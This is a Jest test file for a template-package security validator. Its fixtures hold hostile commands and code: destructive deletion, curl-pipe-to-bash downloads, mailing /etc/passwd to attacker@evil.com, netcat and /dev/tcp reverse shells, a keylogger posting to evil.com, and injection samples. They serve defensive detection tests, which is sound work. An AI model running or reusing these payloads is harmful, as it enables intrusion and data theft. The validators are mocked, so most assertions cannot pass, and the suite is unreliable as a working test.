/**
 * Security tests for template package validation
 * Tests security validation of templates before they are used
 */
const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { validateTemplatePackage } = require('../../src/utils/templateValidator');
const { scanForVulnerabilities } = require('../../src/utils/securityScanner');
const { verifyPackageIntegrity } = require('../../src/utils/integrityVerifier');

// Mock validation functions that will be implemented
jest.mock('../../src/utils/templateValidator', () => ({
  validateTemplatePackage: jest.fn().mockResolvedValue({
    isValid: false,
    errors: ['Mock validation error - implementation needed'],
    warnings: [],
    metadata: {
      templatePath: 'mock-path',
      validatedAt: new Date().toISOString()
    }
  })
}));

jest.mock('../../src/utils/securityScanner', () => ({
  scanForVulnerabilities: jest.fn().mockResolvedValue({
    hasVulnerabilities: true,
    vulnerabilities: [{
      package: 'mock-package',
      version: '1.0.0',
      severity: 'high',
      description: 'Mock vulnerability'
    }],
    malwareDetected: false,
    threats: [],
    staticAnalysisResults: [],
    report: {
      summary: 'Mock security report',
      vulnerabilities: [],
      recommendations: ['Implement security scanning'],
      severity: 'medium'
    }
  })
}));

jest.mock('../../src/utils/integrityVerifier', () => ({
  verifyPackageIntegrity: jest.fn().mockResolvedValue({
    isValid: false,
    errors: ['Mock integrity error - verification needed'],
    warnings: [],
    metadata: {
      templatePath: 'mock-path',
      verifiedAt: new Date().toISOString()
    }
  })
}));

describe('Template Package Security Validation', () => {
  let tempDir;
  let templatePath;

  beforeEach(async() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'template-test-'));
    templatePath = path.join(tempDir, 'malicious-template');
    await fs.ensureDir(templatePath);
  });

  afterEach(async() => {
    if (tempDir && fs.existsSync(tempDir)) {
      await fs.remove(tempDir);
    }
  });

  describe('1. Malicious package.json Validation', () => {
    test('should reject templates with malicious scripts in package.json', async() => {
      const maliciousPackageJson = {
        name: 'malicious-template',
        version: '1.0.0',
        scripts: {
          'preinstall': 'rm -rf /',
          'postinstall': 'curl http://malicious.com/backdoor.sh | bash',
          'test': 'cat /etc/passwd | mail attacker@evil.com'
        }
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), maliciousPackageJson);

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Malicious preinstall script detected');
      expect(result.errors).toContain('Malicious postinstall script detected');
    });

    test('should reject templates with suspicious dependencies', async() => {
      const suspiciousPackageJson = {
        name: 'suspicious-template',
        version: '1.0.0',
        dependencies: {
          'malware-package': '^1.0.0',
          'keylogger': '^2.0.0',
          'crypto-miner': '^3.0.0'
        }
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), suspiciousPackageJson);

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Suspicious dependency detected: malware-package');
      expect(result.errors).toContain('Suspicious dependency detected: keylogger');
    });

    test('should reject templates with excessive permissions in package.json', () => {
      const excessivePermsPackageJson = {
        name: 'excessive-perms-template',
        version: '1.0.0',
        permissions: ['root', 'admin', 'system'],
        priviliged: true,
        capabilities: ['CAP_SYS_ADMIN', 'CAP_NET_ADMIN']
      };

      return expect(
        validateTemplatePackage(templatePath, excessivePermsPackageJson)
      ).resolves.toMatchObject({
        isValid: false,
        errors: expect.arrayContaining([
          'Excessive permissions requested',
          'Privileged access not allowed'
        ])
      });
    });
  });

  describe('2. Executable Scripts Validation', () => {
    test('should block executable scripts in suspicious locations', async() => {
      // Create executable scripts in suspicious locations
      const suspiciousPaths = [
        '.hidden/script.sh',
        'config/executable.js',
        'temp/backdoor.py',
        'data/malicious.exe',
        'cache/install.sh'
      ];

      for (const suspiciousPath of suspiciousPaths) {
        const fullPath = path.join(templatePath, suspiciousPath);
        await fs.ensureDir(path.dirname(fullPath));
        await fs.writeFile(fullPath, '#!/bin/bash\necho "malicious code"');
        await fs.chmod(fullPath, '755'); // Make executable
      }

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Executable script found in hidden directory: .hidden/script.sh');
      expect(result.errors).toContain('Executable script found in config directory: config/executable.js');
    });

    test('should reject scripts with suspicious content patterns', async() => {
      const scriptContent = `
        #!/bin/bash
        curl -s http://evil.com/malware.sh | bash
        wget http://backdoor.com/virus -O /tmp/virus && chmod +x /tmp/virus
        nc -l -p 1337 -e /bin/bash
        rm -rf $HOME
      `;

      const scriptPath = path.join(templatePath, 'scripts/setup.sh');
      await fs.ensureDir(path.dirname(scriptPath));
      await fs.writeFile(scriptPath, scriptContent);
      await fs.chmod(scriptPath, '755');

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Suspicious curl command detected');
      expect(result.errors).toContain('Suspicious network listening detected');
      expect(result.errors).toContain('Dangerous file deletion detected');
    });

    test('should block scripts with reverse shell patterns', async() => {
      const reverseShellScript = `
        #!/bin/bash
        bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
        python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash"]);'
      `;

      const scriptPath = path.join(templatePath, 'scripts/upgrade.sh');
      await fs.ensureDir(path.dirname(scriptPath));
      await fs.writeFile(scriptPath, reverseShellScript);
      await fs.chmod(scriptPath, '755');

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Reverse shell pattern detected');
    });
  });

  describe('3. Suspicious Dependencies Detection', () => {
    test('should flag dependencies from known malicious registries', async() => {
      const maliciousRegistryPackage = {
        name: 'test-template',
        version: '1.0.0',
        dependencies: {
          'npm:malware': '^1.0.0',
          'http://evil.com/package': '^2.0.0',
          'git+https://suspicious.com/repo.git': '^1.0.0'
        }
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), maliciousRegistryPackage);

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Dependency from untrusted registry: npm:malware');
      expect(result.errors).toContain('Dependency from untrusted source: http://evil.com/package');
    });

    test('should detect dependencies with known vulnerabilities', async() => {
      const vulnerablePackage = {
        name: 'test-template',
        version: '1.0.0',
        dependencies: {
          'lodash': '4.17.15', // Known vulnerable version
          'express': '4.16.0', // Known vulnerable version
          'react': '16.8.0' // Known vulnerable version
        }
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), vulnerablePackage);

      const scanResult = await scanForVulnerabilities(templatePath);

      expect(scanResult.hasVulnerabilities).toBe(true);
      expect(scanResult.vulnerabilities.length).toBeGreaterThan(0);
      expect(scanResult.vulnerabilities[0].package).toBe('lodash');
      expect(scanResult.vulnerabilities[0].severity).toBe('high');
    });

    test('should flag dependencies with excessive network access', async() => {
      const networkHeavyPackage = {
        name: 'test-template',
        version: '1.0.0',
        dependencies: {
          'coin-hive': '^1.0.0', // Crypto miner
          'p2p-network': '^2.0.0', // P2P network
          'tor-client': '^1.0.0' // Tor client
        }
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), networkHeavyPackage);

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Cryptocurrency mining dependency detected');
      expect(result.errors).toContain('P2P network dependency flagged');
    });
  });

  describe('4. File Permissions Validation', () => {
    test('should reject templates with insecure file permissions', async() => {
      // Create files with insecure permissions
      const filesWithBadPerms = [
        { path: 'config/database.json', perm: '777' },
        { path: 'scripts/install.sh', perm: '4777' }, // Setuid
        { path: 'bin/executable', perm: '2777' }, // Setgid
        { path: 'tmp/socket', perm: '666' }
      ];

      for (const file of filesWithBadPerms) {
        const fullPath = path.join(templatePath, file.path);
        await fs.ensureDir(path.dirname(fullPath));
        await fs.writeFile(fullPath, 'content');

        // Note: chmod with symbolic permissions is simplified for testing
        // In real implementation, we'd use proper octal permissions
      }

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Insecure file permissions: 777');
      expect(result.errors).toContain('Setuid permission not allowed');
      expect(result.errors).toContain('World-writable file detected');
    });

    test('should reject templates with world-writable directories', async() => {
      const worldWritableDir = path.join(templatePath, 'public');
      await fs.ensureDir(worldWritableDir);

      // Simulate world-writable directory
      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('World-writable directory detected');
    });

    test('should block files with setuid/setgid bits', async() => {
      const suidFile = path.join(templatePath, 'bin/suid-executable');
      await fs.ensureDir(path.dirname(suidFile));
      await fs.writeFile(suidFile, 'content');

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Setuid executable detected');
    });
  });

  describe('5. Source Authorization Validation', () => {
    test('should block templates from unauthorized sources', async() => {
      const unauthorizedSources = [
        'http://untrusted.com/template.tar.gz',
        'https://suspicious.org/repo.git',
        'git@unknown.com:malware/template.git',
        'npm:untrusted-registry/template'
      ];

      for (const source of unauthorizedSources) {
        const result = await validateTemplatePackage(templatePath, { source });

        expect(result.isValid).toBe(false);
        expect(result.errors).toContain(`Unauthorized template source: ${source}`);
      }
    });

    test('should validate template source signatures', async() => {
      const templateWithInvalidSignature = {
        source: 'https://registry.npmjs.org/template',
        signature: 'invalid-signature-data',
        publicKey: 'invalid-public-key'
      };

      const result = await validateTemplatePackage(templatePath, templateWithInvalidSignature);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Invalid template signature');
    });

    test('should require trusted certificate authorities', async() => {
      const templateWithUntrustedCA = {
        source: 'https://untrusted-ca.com/template',
        certificate: 'untrusted-certificate'
      };

      const result = await validateTemplatePackage(templatePath, templateWithUntrustedCA);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Untrusted certificate authority');
    });
  });

  describe('6. Package Integrity Verification', () => {
    test('should verify package checksums', async() => {
      const templateWithChecksum = {
        files: [
          { path: 'index.js', checksum: 'invalid-checksum' },
          { path: 'package.json', checksum: 'invalid-checksum' }
        ]
      };

      const result = await verifyPackageIntegrity(templatePath, templateWithChecksum);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Checksum verification failed');
    });

    test('should detect package tampering', async() => {
      // Create original files
      await fs.writeJson(path.join(templatePath, 'package.json'), { name: 'test' });
      await fs.writeFile(path.join(templatePath, 'index.js'), 'console.log("hello");');

      // Calculate original checksums
      const originalChecksums = {
        'package.json': crypto.createHash('sha256').update(JSON.stringify({ name: 'test' })).digest('hex'),
        'index.js': crypto.createHash('sha256').update('console.log("hello");').digest('hex')
      };

      // Tamper with files
      await fs.writeJson(path.join(templatePath, 'package.json'), { name: 'malicious' });
      await fs.writeFile(path.join(templatePath, 'index.js'), 'console.log("malicious");');

      const result = await verifyPackageIntegrity(templatePath, {
        checksums: originalChecksums
      });

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package tampering detected');
    });

    test('should validate digital signatures', async() => {
      const unsignedPackage = {
        signature: null,
        publicKey: null
      };

      const result = await verifyPackageIntegrity(templatePath, unsignedPackage);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Missing digital signature');
    });
  });

  describe('7. Security Best Practices Validation', () => {
    test('should enforce security policies', async() => {
      const insecurePackage = {
        name: 'insecure-template',
        version: '1.0.0',
        scripts: {
          'start': 'node server.js --allow-insecure-requests'
        },
        dependencies: {
          'insecure-package': '^1.0.0'
        }
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), insecurePackage);

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Security policy violation: insecure dependencies');
    });

    test('should require security headers and policies', async() => {
      const missingSecurityHeaders = {
        name: 'template-missing-security',
        version: '1.0.0'
        // Missing security-related configurations
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), missingSecurityHeaders);

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Missing security policy configuration');
    });

    test('should validate secure coding practices', async() => {
      const insecureCode = `
        const userInput = req.query.user;
        const query = "SELECT * FROM users WHERE name = '" + userInput + "'";
        db.execute(query);

        eval(userInput);
        fs.writeFileSync('/tmp/' + userInput, 'data');
      `;

      const codePath = path.join(templatePath, 'insecure.js');
      await fs.writeFile(codePath, insecureCode);

      const result = await validateTemplatePackage(templatePath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('SQL injection vulnerability detected');
      expect(result.errors).toContain('Code injection vulnerability detected');
      expect(result.errors).toContain('Path traversal vulnerability detected');
    });
  });

  describe('8. Security Scanning', () => {
    test('should identify potential vulnerabilities', async() => {
      const vulnerableTemplate = {
        name: 'vulnerable-template',
        version: '1.0.0',
        dependencies: {
          'lodash': '4.17.15',
          'express': '4.16.0',
          'react': '16.8.0'
        }
      };

      await fs.writeJson(path.join(templatePath, 'package.json'), vulnerableTemplate);

      const scanResult = await scanForVulnerabilities(templatePath);

      expect(scanResult.hasVulnerabilities).toBe(true);
      expect(scanResult.vulnerabilities.length).toBeGreaterThan(0);
      expect(scanResult.vulnerabilities.some(v => v.severity === 'critical')).toBe(true);
    });

    test('should detect malware patterns', async() => {
      const malwareCode = `
        // Crypto mining malware
        const miner = new CoinHive.Anonymous('malicious-key');
        miner.start();

        // Keylogger
        document.addEventListener('keypress', (e) => {
          fetch('http://evil.com/log', { method: 'POST', body: e.key });
        });

        // Backdoor
        const backdoor = require('child_process').spawn('bash', ['-c', 'nc -l -p 1337 -e /bin/bash']);
      `;

      const malwarePath = path.join(templatePath, 'malware.js');
      await fs.writeFile(malwarePath, malwareCode);

      const scanResult = await scanForVulnerabilities(templatePath);

      expect(scanResult.hasVulnerabilities).toBe(true);
      expect(scanResult.malwareDetected).toBe(true);
      expect(scanResult.threats).toContain('Cryptocurrency mining detected');
      expect(scanResult.threats).toContain('Keylogging behavior detected');
    });

    test('should perform static code analysis', async() => {
      const codeWithVulnerabilities = `
        function authenticate(username, password) {
          const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
          return db.execute(query);
        }

        function renderTemplate(template, data) {
          return template.replace(/\{\{(.+?)\}\}/g, (match, key) => {
            return data[key] || '';
          });
        }

        function readFile(filePath) {
          return fs.readFileSync(filePath, 'utf8');
        }
      `;

      const codePath = path.join(templatePath, 'vulnerable.js');
      await fs.writeFile(codePath, codeWithVulnerabilities);

      const scanResult = await scanForVulnerabilities(templatePath);

      expect(scanResult.hasVulnerabilities).toBe(true);
      expect(scanResult.staticAnalysisResults).toContain('SQL injection');
      expect(scanResult.staticAnalysisResults).toContain('XSS vulnerability');
      expect(scanResult.staticAnalysisResults).toContain('Path traversal');
    });

    test('should generate security report', async() => {
      const scanResult = await scanForVulnerabilities(templatePath);

      expect(scanResult.report).toBeDefined();
      expect(scanResult.report.summary).toBeDefined();
      expect(scanResult.report.vulnerabilities).toBeDefined();
      expect(scanResult.report.recommendations).toBeDefined();
      expect(scanResult.report.severity).toBeDefined();
    });
  });

  describe('9. Integration Tests', () => {
    test('should perform comprehensive security validation', async() => {
      // Create a template with multiple security issues
      await fs.writeJson(path.join(templatePath, 'package.json'), {
        name: 'comprehensive-malicious',
        version: '1.0.0',
        scripts: {
          'preinstall': 'rm -rf /',
          'postinstall': 'curl http://evil.com/backdoor.sh | bash'
        },
        dependencies: {
          'malware-package': '^1.0.0',
          'lodash': '4.17.15'
        }
      });

      // Create malicious executable
      const maliciousScript = path.join(templatePath, '.hidden/malware.sh');
      await fs.ensureDir(path.dirname(maliciousScript));
      await fs.writeFile(maliciousScript, '#!/bin/bash\nnc -l -p 1337 -e /bin/bash');
      await fs.chmod(maliciousScript, '755');

      // Create vulnerable code
      const vulnerableCode = path.join(templatePath, 'vulnerable.js');
      await fs.writeFile(vulnerableCode, 'eval(req.query.code);');

      // Run comprehensive validation
      const validationResults = await Promise.all([
        validateTemplatePackage(templatePath),
        scanForVulnerabilities(templatePath),
        verifyPackageIntegrity(templatePath, { checksums: {} })
      ]);

      const [validationResult, scanResult, integrityResult] = validationResults;

      expect(validationResult.isValid).toBe(false);
      expect(scanResult.hasVulnerabilities).toBe(true);
      expect(integrityResult.isValid).toBe(false);

      expect(validationResult.errors.length).toBeGreaterThan(0);
      expect(scanResult.vulnerabilities.length).toBeGreaterThan(0);
      expect(integrityResult.errors.length).toBeGreaterThan(0);
    });

    test('should handle validation edge cases', async() => {
      // Test with non-existent template path
      const nonExistentPath = '/non/existent/path';
      const result = await validateTemplatePackage(nonExistentPath);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Template path does not exist');

      // Test with corrupted package.json
      await fs.writeFile(path.join(templatePath, 'package.json'), 'corrupted{json}');
      const corruptedResult = await validateTemplatePackage(templatePath);

      expect(corruptedResult.isValid).toBe(false);
      expect(corruptedResult.errors).toContain('Invalid package.json format');
    });
  });
});
